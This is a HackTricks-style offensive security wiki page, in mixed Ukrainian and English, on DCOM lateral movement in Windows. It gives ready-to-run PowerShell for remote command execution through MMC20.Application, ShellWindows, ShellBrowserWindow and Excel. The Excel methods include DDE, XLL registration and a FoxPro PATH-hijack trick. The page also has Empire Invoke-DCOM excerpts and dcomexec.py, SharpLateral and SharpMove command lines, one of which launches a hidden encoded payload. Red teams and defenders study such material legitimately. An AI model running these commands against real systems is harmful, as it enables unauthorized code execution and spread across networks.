# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement є привабливим, тому що він повторно використовує наявні COM servers, exposed over RPC/DCOM, замість створення service або scheduled task. На практиці це означає, що початкове з’єднання зазвичай стартує на TCP/135, а потім переходить на динамічно призначені high RPC ports.

## Prerequisites & Gotchas

- Зазвичай вам потрібен local administrator context на target, а remote COM server має дозволяти remote launch/activation.
- Починаючи з **14 березня 2023**, Microsoft застосовує DCOM hardening для supported systems. Старі clients, які запитують низький activation authentication level, можуть fail, якщо вони не узгодять принаймні `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients зазвичай автоматично підвищуються, тож поточний tooling зазвичай продовжує працювати.
- Manual або scripted DCOM execution загалом потребує TCP/135 плюс dynamic RPC port range target'а. Якщо ви використовуєте `dcomexec.py` з Impacket і хочете отримати назад command output, зазвичай також потрібен SMB access до `ADMIN$` (або іншого writable/readable share).
- Якщо RPC/DCOM працює, але SMB заблокований, `dcomexec.py -nooutput` все ще може бути корисним для blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Для отримання додаткової інформації про цю техніку перегляньте оригінальний пост від [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Об’єкти Distributed Component Object Model (DCOM) надають цікаву можливість для взаємодії з об’єктами через мережу. Microsoft надає вичерпну документацію як для DCOM, так і для Component Object Model (COM), доступну [тут для DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) і [тут для COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Список DCOM applications можна отримати за допомогою команди PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), enables scripting of MMC snap-in operations. Notably, this object contains a `ExecuteShellCommand` method under `Document.ActiveView`. More information about this method can be found [here](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Check it running:

Ця функція дає змогу виконувати команди через мережу за допомогою DCOM application. Щоб взаємодіяти з DCOM remotely як admin, PowerShell можна використати так:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ця команда підключається до DCOM application і повертає instance COM object. Потім можна викликати метод ExecuteShellCommand, щоб виконати process на remote host. Процес включає такі кроки:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Отримати RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Останній аргумент — це стиль вікна. `7` залишає вікно згорнутим. На практиці MMC-based execution зазвичай призводить до того, що віддалений процес `mmc.exe` запускає ваш payload, що відрізняється від об’єктів на базі Explorer нижче.

## ShellWindows & ShellBrowserWindow

**Для отримання додаткової інформації про цю technique перегляньте оригінальний пост [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Було виявлено, що об’єкт **MMC20.Application** не має явних "LaunchPermissions", тому за замовчуванням використовує permissions, які дозволяють доступ Administrators. Для додаткових відомостей можна переглянути обговорення [here](https://twitter.com/tiraniddo/status/817532039771525120), а також рекомендується використання [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET для фільтрації об’єктів без явного Launch Permission.

Два конкретні об’єкти, `ShellBrowserWindow` і `ShellWindows`, були виділені через відсутність явних Launch Permissions. Відсутність запису `LaunchPermission` у реєстрі під `HKCR:\AppID\{guid}` означає відсутність явних permissions.

Порівняно з `MMC20.Application`, ці об’єкти часто менш помітні з OPSEC-погляду, оскільки команда зазвичай стає дочірнім процесом `explorer.exe` на віддаленому хості, а не `mmc.exe`.

### ShellWindows

Для `ShellWindows`, який не має ProgID, .NET-методи `Type.GetTypeFromCLSID` і `Activator.CreateInstance` спрощують інстанціювання об’єкта за допомогою його AppID. Цей процес використовує OleView .NET для отримання CLSID для `ShellWindows`. Після інстанціювання взаємодія можлива через метод `WindowsShell.Item`, що призводить до виклику методу на кшталт `Document.Application.ShellExecute`.

Нижче наведено приклад PowerShell-команд для інстанціювання об’єкта та віддаленого виконання команд:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` схожий, але його можна інстанціювати напряму через його CLSID і перейти до `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement with Excel DCOM Objects

Lateral movement можна здійснювати, експлуатуючи DCOM Excel objects. Для детальнішої інформації варто прочитати обговорення про використання Excel DDE для lateral movement via DCOM у [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Проєкт Empire надає PowerShell script, який демонструє використання Excel для remote code execution (RCE) шляхом маніпулювання DCOM objects. Нижче наведено фрагменти зі script, доступного в [Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), що показують різні methods для abuse Excel для RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Нещодавні дослідження розширили цю область за допомогою методу `Excel.Application`'s `ActivateMicrosoftApp()`. Ключова ідея полягає в тому, що Excel може спробувати запустити застарілі застосунки Microsoft, такі як FoxPro, Schedule Plus або Project, шукаючи їх у системному `PATH`. Якщо оператор може розмістити payload з однією з цих очікуваних назв у доступному для запису розташуванні, яке є частиною `PATH` цілі, Excel виконає його.

Вимоги для цієї варіації:

- Local admin на цілі
- Excel встановлений на цілі
- Можливість записати payload у каталог із правом запису в `PATH` цілі

Практичний приклад зловживання пошуком FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Якщо на атакуючому хості не зареєстровано локальний `Excel.Application` ProgID, створіть віддалений об’єкт за CLSID замість цього:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Значення, які на практиці використовувалися:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Automation Tools for Lateral Movement

Два інструменти виділяються для автоматизації цих технік:

- **Invoke-DCOM.ps1**: PowerShell-скрипт, наданий проєктом Empire, який спрощує виклик різних методів для виконання коду на віддалених машинах. Цей скрипт доступний у репозиторії Empire на GitHub.

- **SharpLateral**: інструмент, призначений для віддаленого виконання коду, який можна використовувати з командою:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Автоматичні інструменти

- Скрипт Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) дозволяє легко викликати всі згадані способи виконання коду на інших машинах.
- Ви можете використовувати `dcomexec.py` з Impacket для виконання команд на віддалених системах через DCOM. Поточні збірки підтримують `ShellWindows`, `ShellBrowserWindow` і `MMC20`, а за замовчуванням використовують `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Ви також можете використати [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Ви також можете використати [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
